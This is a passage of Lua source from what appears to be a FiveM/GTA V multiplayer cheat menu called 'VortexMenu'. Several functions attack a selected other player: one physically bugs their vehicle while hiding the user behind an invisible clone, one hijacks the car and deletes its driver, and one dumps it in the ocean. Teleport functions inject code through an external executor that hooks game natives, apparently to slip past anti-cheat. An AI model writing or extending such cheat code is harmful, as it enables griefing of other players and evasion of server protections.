            RequestModel(playerModel)
            local timeout = 0
            while not HasModelLoaded(playerModel) and timeout < 50 do
                Citizen.Wait(50)
                timeout = timeout + 1
            end

            local groundZ = myCoords.z
            local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
            local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
            if hit then
                groundZ = hitCoords.z
            end

            local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
            SetEntityCollision(clonePed, false, false)
            FreezeEntityPosition(clonePed, true)
            SetEntityInvincible(clonePed, true)
            SetBlockingOfNonTemporaryEvents(clonePed, true)
            SetPedCanRagdoll(clonePed, false)
            ClonePedToTarget(playerPed, clonePed)

            SetEntityVisible(playerPed, false, false)
            SetEntityLocallyInvisible(playerPed)

            local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)

            if not closestVeh or closestVeh == 0 then
                SetEntityVisible(playerPed, true, false)
                SetCamActive(bugVehCam, false)
                if not rawget(_G, 'isSpectating') then
                    RenderScriptCams(false, false, 0, true, true)
                end
                DestroyCam(bugVehCam, true)
                if DoesEntityExist(clonePed) then
                    DeleteEntity(clonePed)
                end
                SetModelAsNoLongerNeeded(playerModel)
                return
            end

            SetPedIntoVehicle(playerPed, closestVeh, -1)
            Citizen.Wait(150)
            SetEntityAsMissionEntity(closestVeh, true, true)
            if NetworkGetEntityIsNetworked(closestVeh) then
                NetworkRequestControlOfEntity(closestVeh)
                local timeout = 0
                while not NetworkHasControlOfEntity(closestVeh) and timeout < 50 do
                    NetworkRequestControlOfEntity(closestVeh)
                    Citizen.Wait(10)
                    timeout = timeout + 1
                end
            end

            SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
            SetEntityHeading(playerPed, myHeading)
            Citizen.Wait(100)

            if not DoesEntityExist(targetVehicle) or not DoesEntityExist(closestVeh) then
                SetEntityVisible(playerPed, true, false)
                SetCamActive(bugVehCam, false)
                if not rawget(_G, 'isSpectating') then
                    RenderScriptCams(false, false, 0, true, true)
                end
                DestroyCam(bugVehCam, true)
                if DoesEntityExist(clonePed) then
                    DeleteEntity(clonePed)
                end
                SetModelAsNoLongerNeeded(playerModel)
                return
            end

            for i = 1, 30 do
                if not DoesEntityExist(targetVehicle) or not DoesEntityExist(closestVeh) then
                    break
                end
                DetachEntity(closestVeh, true, true)
                Citizen.Wait(5)
                AttachEntityToEntityPhysically(
                    closestVeh,
                    targetVehicle,
                    0, 0, 0,
                    2000.0, 1460.928, 1000.0,
                    10.0, 88.0, 600.0,
                    true, true, true, false, 0
                )
                Citizen.Wait(5)
            end

            Citizen.Wait(500)
            SetEntityVisible(playerPed, true, false)
            SetCamActive(bugVehCam, false)
            if not rawget(_G, 'isSpectating') then
                RenderScriptCams(false, false, 0, true, true)
            end
            DestroyCam(bugVehCam, true)
            if DoesEntityExist(clonePed) then
                DeleteEntity(clonePed)
            end
            SetModelAsNoLongerNeeded(playerModel)
        end)
        elseif VortexMenu.bugVehicleMode == "v2" then
            if not VortexMenu.selectedPlayer then
                return
            end

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then
                return
            end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then
                return
            end

            if not IsPedInAnyVehicle(targetPed, false) then
                return
            end

            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if not DoesEntityExist(targetVehicle) then
                return
            end

            Citizen.CreateThread(function()
                local playerPed = PlayerPedId()
                local myCoords = GetEntityCoords(playerPed)
                local myHeading = GetEntityHeading(playerPed)

                local bugVehCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
                local camCoords = GetGameplayCamCoord()
                local camRot = GetGameplayCamRot(2)
                SetCamCoord(bugVehCam, camCoords.x, camCoords.y, camCoords.z)
                SetCamRot(bugVehCam, camRot.x, camRot.y, camRot.z, 2)
                SetCamFov(bugVehCam, GetGameplayCamFov())
                SetCamActive(bugVehCam, true)
                RenderScriptCams(true, false, 0, true, true)

                local playerModel = GetEntityModel(playerPed)
                RequestModel(playerModel)
                local timeout = 0
                while not HasModelLoaded(playerModel) and timeout < 50 do
                    Citizen.Wait(50)
                    timeout = timeout + 1
                end

                local groundZ = myCoords.z
                local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
                local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
                if hit then
                    groundZ = hitCoords.z
                end

                local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
                SetEntityCollision(clonePed, false, false)
                FreezeEntityPosition(clonePed, true)
                SetEntityInvincible(clonePed, true)
                SetBlockingOfNonTemporaryEvents(clonePed, true)
                SetPedCanRagdoll(clonePed, false)
                ClonePedToTarget(playerPed, clonePed)

                SetEntityVisible(playerPed, false, false)
                SetEntityLocallyInvisible(playerPed)

                local vehicles = {}
                local searchRadius = 100.0
                local vehHandle, veh = FindFirstVehicle()
                local success

                repeat
                    if veh ~= targetVehicle and DoesEntityExist(veh) then
                        local vehCoords = GetEntityCoords(veh)
                        local distance = #(myCoords - vehCoords)
                        local vehClass = GetVehicleClass(veh)
                        if distance <= searchRadius and vehClass ~= 8 and vehClass ~= 13 then
                            table.insert(vehicles, {handle = veh, distance = distance})
                        end
                    end
                    success, veh = FindNextVehicle(vehHandle)
                until not success
                EndFindVehicle(vehHandle)

                if #vehicles < 2 then
                    SetEntityVisible(playerPed, true, false)
                    SetCamActive(bugVehCam, false)
                    if not rawget(_G, 'isSpectating') then
                        RenderScriptCams(false, false, 0, true, true)
                    end
                    DestroyCam(bugVehCam, true)
                    if DoesEntityExist(clonePed) then
                        DeleteEntity(clonePed)
                    end
                    SetModelAsNoLongerNeeded(playerModel)
                    return
                end

                table.sort(vehicles, function(a, b) return a.distance < b.distance end)
                local firstVeh = vehicles[1].handle
                local secondVeh = vehicles[2].handle

                SetPedIntoVehicle(playerPed, firstVeh, -1)
                Citizen.Wait(150)
                SetEntityAsMissionEntity(firstVeh, true, true)
                if NetworkGetEntityIsNetworked(firstVeh) then
                    NetworkRequestControlOfEntity(firstVeh)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(firstVeh) and timeout < 50 do
                        NetworkRequestControlOfEntity(firstVeh)
                        Citizen.Wait(10)
                        timeout = timeout + 1
                    end
                end

                SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                SetEntityHeading(playerPed, myHeading)
                Citizen.Wait(100)

                SetPedIntoVehicle(playerPed, secondVeh, -1)
                Citizen.Wait(150)
                SetEntityAsMissionEntity(secondVeh, true, true)
                if NetworkGetEntityIsNetworked(secondVeh) then
                    NetworkRequestControlOfEntity(secondVeh)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(secondVeh) and timeout < 50 do
                        NetworkRequestControlOfEntity(secondVeh)
                        Citizen.Wait(10)
                        timeout = timeout + 1
                    end
                end

                SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                SetEntityHeading(playerPed, myHeading)
                Citizen.Wait(100)

                if not DoesEntityExist(targetVehicle) or not DoesEntityExist(secondVeh) then
                    SetEntityVisible(playerPed, true, false)
                    SetCamActive(bugVehCam, false)
                    if not rawget(_G, 'isSpectating') then
                        RenderScriptCams(false, false, 0, true, true)
                    end
                    DestroyCam(bugVehCam, true)
                    if DoesEntityExist(clonePed) then
                        DeleteEntity(clonePed)
                    end
                    SetModelAsNoLongerNeeded(playerModel)
                    return
                end

                SetEntityNoCollisionEntity(secondVeh, targetVehicle, true)
                SetEntityNoCollisionEntity(targetVehicle, secondVeh, true)

                    for i = 1, 30 do
                        if not DoesEntityExist(targetVehicle) or not DoesEntityExist(secondVeh) then
                            break
                        end
                        DetachEntity(secondVeh, true, true)
                        Citizen.Wait(5)
                        AttachEntityToEntityPhysically(
                            secondVeh,
                            targetVehicle,
                            0, 0, 0,
                            2000.0, 1460.928, 1000.0,
                            10.0, 88.0, 600.0,
                            true, true, true, false, 0
                        )
                        Citizen.Wait(5)
                    end

                    Citizen.Wait(500)
                SetEntityVisible(playerPed, true, false)
                SetCamActive(bugVehCam, false)
                if not rawget(_G, 'isSpectating') then
                    RenderScriptCams(false, false, 0, true, true)
                end
                DestroyCam(bugVehCam, true)
                if DoesEntityExist(clonePed) then
                    DeleteEntity(clonePed)
                end
                SetModelAsNoLongerNeeded(playerModel)
                end)
            end
        end
    end,

    warpvehicle = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

        if not IsPedInAnyVehicle(targetPed, false) then
            return
        end

        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
        if not DoesEntityExist(targetVehicle) then
            return
        end

        local playerPed = PlayerPedId()

        local function RequestControl(entity, timeoutMs)
            if not entity or not DoesEntityExist(entity) then return false end
            local start = GetGameTimer()
            NetworkRequestControlOfEntity(entity)
            while not NetworkHasControlOfEntity(entity) do
                Citizen.Wait(0)
                if GetGameTimer() - start > (timeoutMs or 500) then
                    return false
                end
                NetworkRequestControlOfEntity(entity)
            end
            return true
        end

        local function tryEnterSeat(seatIndex)
            SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
            Citizen.Wait(0)
            return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
        end

        local function getFirstFreeSeat(v)
            local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
            if not numSeats or numSeats <= 0 then return -1 end
            for seat = 0, (numSeats - 2) do
                if IsVehicleSeatFree(v, seat) then return seat end
            end
            return -1
        end

        ClearPedTasksImmediately(playerPed)
        SetVehicleDoorsLocked(targetVehicle, 1)
        SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            return
        end

        if GetPedInVehicleSeat(targetVehicle, -1) == playerPed then
            return
        end

        local fallbackSeat = getFirstFreeSeat(targetVehicle)
        if fallbackSeat ~= -1 and tryEnterSeat(fallbackSeat) then
            local drv = GetPedInVehicleSeat(targetVehicle, -1)
            if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
                RequestControl(drv, 750)
                ClearPedTasksImmediately(drv)
                SetEntityAsMissionEntity(drv, true, true)
                SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
                Citizen.Wait(50)
                DeleteEntity(drv)

                for i=1,80 do
                    local occ = GetPedInVehicleSeat(targetVehicle, -1)
                    if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
                    Citizen.Wait(0)
                end
            end

            for attempt = 1, 30 do
                if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                    return
                end
                Citizen.Wait(0)
            end
        end

    end,

    tp_waypoint = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("GetFirstBlipInfoId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetBlipInfoIdCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesBlipExist", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)

                CreateThread(function()
                    local waypointBlip = GetFirstBlipInfoId(8)
                    if not DoesBlipExist(waypointBlip) then
                        return
                    end

                    local waypointCoords = GetBlipInfoIdCoord(waypointBlip)
                    if not waypointCoords or (waypointCoords.x == 0.0 and waypointCoords.y == 0.0) then
                        return
                    end

                    local playerPed = PlayerPedId()
                    local isInVehicle = IsPedInAnyVehicle(playerPed, false)
                    local entity = isInVehicle and GetVehiclePedIsIn(playerPed, false) or playerPed

                    local x, y, z = waypointCoords.x, waypointCoords.y, waypointCoords.z

                    local groundZ = z
                    local found, groundZResult = GetGroundZFor_3dCoord(x, y, z, groundZ, false)
                    if found then
                        groundZ = groundZResult
                    end

                    RequestCollisionAtCoord(x, y, groundZ)
                    for i = 1, 50 do
                        Wait(0)
                        RequestCollisionAtCoord(x, y, groundZ)
                    end

                    SetEntityCoordsNoOffset(entity, x, y, groundZ + 1.0, false, false, false)
                    ClearPedTasksImmediately(playerPed)
                end)
            ]])
        else
            CreateThread(function()
                local waypointBlip = GetFirstBlipInfoId(8)
                if not DoesBlipExist(waypointBlip) then
                    return
                end

                local waypointCoords = GetBlipInfoIdCoord(waypointBlip)
                if not waypointCoords or (waypointCoords.x == 0.0 and waypointCoords.y == 0.0) then
                    return
                end

                local playerPed = PlayerPedId()
                local isInVehicle = IsPedInAnyVehicle(playerPed, false)
                local entity = isInVehicle and GetVehiclePedIsIn(playerPed, false) or playerPed

                local x, y, z = waypointCoords.x, waypointCoords.y, waypointCoords.z

                local groundZ = z
                local found, groundZResult = GetGroundZFor_3dCoord(x, y, z, groundZ, false)
                if found then
                    groundZ = groundZResult
                end

                RequestCollisionAtCoord(x, y, groundZ)
                for i = 1, 50 do
                    Wait(0)
                    RequestCollisionAtCoord(x, y, groundZ)
                end

                SetEntityCoordsNoOffset(entity, x, y, groundZ + 1.0, false, false, false)
                ClearPedTasksImmediately(playerPed)
            end)
        end
    end,

    tp_fib = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)

        CreateThread(function()
            local playerPed = PlayerPedId()
            local isInVehicle = IsPedInAnyVehicle(playerPed, false)
            local entity = isInVehicle and GetVehiclePedIsIn(playerPed, false) or playerPed

            local x, y, z = 140.43, -750.52, 258.15
            RequestCollisionAtCoord(x, y, z)
            for i = 1, 50 do
                Wait(0)
                RequestCollisionAtCoord(x, y, z)
            end

            SetEntityCoordsNoOffset(entity, x, y, z, false, false, false)
            ClearPedTasksImmediately(playerPed)
        end)
            ]])
        else
            CreateThread(function()
                local playerPed = PlayerPedId()
                local isInVehicle = IsPedInAnyVehicle(playerPed, false)
                local entity = isInVehicle and GetVehiclePedIsIn(playerPed, false) or playerPed

                local x, y, z = 140.43, -750.52, 258.15
                RequestCollisionAtCoord(x, y, z)
                for i = 1, 50 do
                    Wait(0)
                    RequestCollisionAtCoord(x, y, z)
                end

                SetEntityCoordsNoOffset(entity, x, y, z, false, false, false)
                ClearPedTasksImmediately(playerPed)
            end)
        end
    end,

    tp_missionrow = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)

        CreateThread(function()
            local playerPed = PlayerPedId()
            local isInVehicle = IsPedInAnyVehicle(playerPed, false)
            local entity = isInVehicle and GetVehiclePedIsIn(playerPed, false) or playerPed

            local x, y, z = 425.1, -979.5, 30.7
            RequestCollisionAtCoord(x, y, z)
            for i = 1, 50 do
                Wait(0)
                RequestCollisionAtCoord(x, y, z)
            end

            SetEntityCoordsNoOffset(entity, x, y, z, false, false, false)
            ClearPedTasksImmediately(playerPed)
        end)
            ]])
        else
            CreateThread(function()
                local playerPed = PlayerPedId()
                local isInVehicle = IsPedInAnyVehicle(playerPed, false)
                local entity = isInVehicle and GetVehiclePedIsIn(playerPed, false) or playerPed

                local x, y, z = 425.1, -979.5, 30.7
                RequestCollisionAtCoord(x, y, z)
                for i = 1, 50 do
                    Wait(0)
                    RequestCollisionAtCoord(x, y, z)
                end

                SetEntityCoordsNoOffset(entity, x, y, z, false, false, false)
                ClearPedTasksImmediately(playerPed)
            end)
        end
    end,

    tp_pillbox = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)

        CreateThread(function()
            local playerPed = PlayerPedId()
            local isInVehicle = IsPedInAnyVehicle(playerPed, false)
            local entity = isInVehicle and GetVehiclePedIsIn(playerPed, false) or playerPed

            local x, y, z = 308.6, -595.3, 43.28
            RequestCollisionAtCoord(x, y, z)
            for i = 1, 50 do
                Wait(0)
                RequestCollisionAtCoord(x, y, z)
            end

            SetEntityCoordsNoOffset(entity, x, y, z, false, false, false)
            ClearPedTasksImmediately(playerPed)
        end)
            ]])
        else
            CreateThread(function()
                local playerPed = PlayerPedId()
                local isInVehicle = IsPedInAnyVehicle(playerPed, false)
                local entity = isInVehicle and GetVehiclePedIsIn(playerPed, false) or playerPed

                local x, y, z = 308.6, -595.3, 43.28
                RequestCollisionAtCoord(x, y, z)
                for i = 1, 50 do
                    Wait(0)
                    RequestCollisionAtCoord(x, y, z)
                end

                SetEntityCoordsNoOffset(entity, x, y, z, false, false, false)
                ClearPedTasksImmediately(playerPed)
            end)
        end
    end,

    tp_grovestreet = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)

        CreateThread(function()
            local playerPed = PlayerPedId()
            local isInVehicle = IsPedInAnyVehicle(playerPed, false)
            local entity = isInVehicle and GetVehiclePedIsIn(playerPed, false) or playerPed

            local x, y, z = 109.63, -1943.14, 20.80
            RequestCollisionAtCoord(x, y, z)
            for i = 1, 50 do
                Wait(0)
                RequestCollisionAtCoord(x, y, z)
            end

            SetEntityCoordsNoOffset(entity, x, y, z, false, false, false)
            ClearPedTasksImmediately(playerPed)
        end)
            ]])
        else
            CreateThread(function()
                local playerPed = PlayerPedId()
                local isInVehicle = IsPedInAnyVehicle(playerPed, false)
                local entity = isInVehicle and GetVehiclePedIsIn(playerPed, false) or playerPed

                local x, y, z = 109.63, -1943.14, 20.80
                RequestCollisionAtCoord(x, y, z)
                for i = 1, 50 do
                    Wait(0)
                    RequestCollisionAtCoord(x, y, z)
                end

                SetEntityCoordsNoOffset(entity, x, y, z, false, false, false)
                ClearPedTasksImmediately(playerPed)
            end)
        end
    end,

    tp_legionsquare = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)

        CreateThread(function()
            local playerPed = PlayerPedId()
            local isInVehicle = IsPedInAnyVehicle(playerPed, false)
            local entity = isInVehicle and GetVehiclePedIsIn(playerPed, false) or playerPed

            local x, y, z = 229.21, -871.61, 30.49
            RequestCollisionAtCoord(x, y, z)
            for i = 1, 50 do
                Wait(0)
                RequestCollisionAtCoord(x, y, z)
            end

            SetEntityCoordsNoOffset(entity, x, y, z, false, false, false)
            ClearPedTasksImmediately(playerPed)
        end)
            ]])
        else
            CreateThread(function()
                local playerPed = PlayerPedId()
                local isInVehicle = IsPedInAnyVehicle(playerPed, false)
                local entity = isInVehicle and GetVehiclePedIsIn(playerPed, false) or playerPed

                local x, y, z = 229.21, -871.61, 30.49
                RequestCollisionAtCoord(x, y, z)
                for i = 1, 50 do
                    Wait(0)
                    RequestCollisionAtCoord(x, y, z)
                end

                SetEntityCoordsNoOffset(entity, x, y, z, false, false, false)
                ClearPedTasksImmediately(playerPed)
            end)
        end
    end,

    tptoocean = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

        if not IsPedInAnyVehicle(targetPed, false) then
            return
        end

        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
        if not DoesEntityExist(targetVehicle) then
            return
        end

        local locations = {
            ocean = {coords = vector3(-3000.0, -3000.0, 0.0), name = "Ocean"},
            mazebank = {coords = vector3(-75.0, -818.0, 326.0), name = "Maze Bank"},
            sandyshores = {coords = vector3(1960.0, 3740.0, 32.0), name = "Sandy Shores"}
        }

        local destCoords = locations[VortexMenu.tpLocation].coords
        local destName = locations[VortexMenu.tpLocation].name

        local playerPed = PlayerPedId()
        local savedCoords = GetEntityCoords(playerPed)
        local savedHeading = GetEntityHeading(playerPed)

        local function RequestControl(entity, timeoutMs)
            if not entity or not DoesEntityExist(entity) then return false end
            local start = GetGameTimer()
            NetworkRequestControlOfEntity(entity)
            while not NetworkHasControlOfEntity(entity) do
                Citizen.Wait(0)
                if GetGameTimer() - start > (timeoutMs or 500) then
                    return false
                end
                NetworkRequestControlOfEntity(entity)
            end
            return true
        end

        local function tryEnterSeat(seatIndex)
            SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
            Citizen.Wait(0)
            return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
        end

        local function getFirstFreeSeat(v)
            local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
            if not numSeats or numSeats <= 0 then return -1 end
            for seat = 0, (numSeats - 2) do
                if IsVehicleSeatFree(v, seat) then return seat end
            end
            return -1
        end

        ClearPedTasksImmediately(playerPed)
        SetVehicleDoorsLocked(targetVehicle, 1)
        SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            TaskLeaveVehicle(playerPed, targetVehicle, 0)
            Citizen.Wait(500)

            SetEntityCoordsNoOffset(targetVehicle, destCoords.x, destCoords.y, destCoords.z, false, false, false)

            Citizen.Wait(100)
            SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
            SetEntityHeading(playerPed, savedHeading)

            return
        end

        if GetPedInVehicleSeat(targetVehicle, -1) == playerPed then
            TaskLeaveVehicle(playerPed, targetVehicle, 0)
            Citizen.Wait(500)

            SetEntityCoordsNoOffset(targetVehicle, destCoords.x, destCoords.y, destCoords.z, false, false, false)

            Citizen.Wait(100)
            SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
            SetEntityHeading(playerPed, savedHeading)

            return
        end

        local fallbackSeat = getFirstFreeSeat(targetVehicle)
        if fallbackSeat ~= -1 and tryEnterSeat(fallbackSeat) then
            local drv = GetPedInVehicleSeat(targetVehicle, -1)
            if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
                RequestControl(drv, 750)
                ClearPedTasksImmediately(drv)
                SetEntityAsMissionEntity(drv, true, true)
                SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
                Citizen.Wait(50)
                DeleteEntity(drv)

                for i=1,80 do
                    local occ = GetPedInVehicleSeat(targetVehicle, -1)
                    if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
                    Citizen.Wait(0)
                end
            end

            for attempt = 1, 30 do
                if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                    TaskLeaveVehicle(playerPed, targetVehicle, 0)
                    Citizen.Wait(500)

                    SetEntityCoordsNoOffset(targetVehicle, destCoords.x, destCoords.y, destCoords.z, false, false, false)

                    Citizen.Wait(100)
                    SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
                    SetEntityHeading(playerPed, savedHeading)

                    return
                end
                Citizen.Wait(0)
            end
        end

    end,

    warpboost = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

        if not IsPedInAnyVehicle(targetPed, false) then
            return
        end

        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
        if not DoesEntityExist(targetVehicle) then
            return
        end

        Citizen.CreateThread(function()
            if rawget(_G, 'warp_boost_player_busy') then return end
            rawset(_G, 'warp_boost_player_busy', true)

            local playerPed = PlayerPedId()
            local initialCoords = GetEntityCoords(playerPed)
            local initialHeading = GetEntityHeading(playerPed)

            local warpBoostCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
            local camCoords = GetGameplayCamCoord()
            local camRot = GetGameplayCamRot(2)
            SetCamCoord(warpBoostCam, camCoords.x, camCoords.y, camCoords.z)
            SetCamRot(warpBoostCam, camRot.x, camRot.y, camRot.z, 2)
            SetCamFov(warpBoostCam, GetGameplayCamFov())
            SetCamActive(warpBoostCam, true)
            RenderScriptCams(true, false, 0, true, true)

            local playerModel = GetEntityModel(playerPed)
            RequestModel(playerModel)
            local timeout = 0
            while not HasModelLoaded(playerModel) and timeout < 50 do
                Citizen.Wait(50)
                timeout = timeout + 1
            end

            local groundZ = initialCoords.z
            local rayHandle = StartShapeTestRay(initialCoords.x, initialCoords.y, initialCoords.z + 2.0, initialCoords.x, initialCoords.y, initialCoords.z - 100.0, 1, 0, 0)
            local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
            if hit then
                groundZ = hitCoords.z
            end

            local clonePed = CreatePed(4, playerModel, initialCoords.x, initialCoords.y, groundZ, initialHeading, false, false)
            SetEntityCollision(clonePed, false, false)
            FreezeEntityPosition(clonePed, true)
            SetEntityInvincible(clonePed, true)
            SetBlockingOfNonTemporaryEvents(clonePed, true)
            SetPedCanRagdoll(clonePed, false)
            ClonePedToTarget(playerPed, clonePed)

            SetEntityVisible(playerPed, false, false)
            SetEntityLocallyInvisible(playerPed)

            local function RequestControl(entity, timeoutMs)
                if not entity or not DoesEntityExist(entity) then return false end
                local start = GetGameTimer()
